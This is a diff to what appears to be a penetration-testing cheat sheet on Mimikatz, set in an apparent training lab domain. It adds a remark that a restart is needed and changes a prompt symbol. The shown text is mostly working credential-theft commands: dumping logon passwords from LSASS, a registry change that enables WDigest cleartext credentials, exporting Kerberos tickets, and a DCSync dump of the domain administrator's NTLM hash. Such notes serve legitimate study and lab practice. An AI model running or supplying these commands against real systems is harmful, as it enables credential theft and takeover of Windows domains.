@@ -16,6 +16,7 @@ PS > .\mimikatz.exe privilege::debug "sekurlsa::logonpasswords" exit
 ```powershell
 PS > reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
 ```
+>This needs a restart to decrypt the WDigested passwords.
 ## Export Tickets
 ```powershell
 PS > .\mimikatz.exe privilege::debug "sekurlsa::tickets /export" exit
@@ -102,8 +103,8 @@ Mimikatz must be ran in the context of the user who has DCSync privileges and on
 - Using 
 ```powershell
 PS > .\mimikatz.exe
-mimikatz # privilege::debug
-mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+mimikatz > privilege::debug
+mimikatz > lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
 ... SNIP ...
 	NTLM: <NTLM-HASH>
 ... SNIP ...
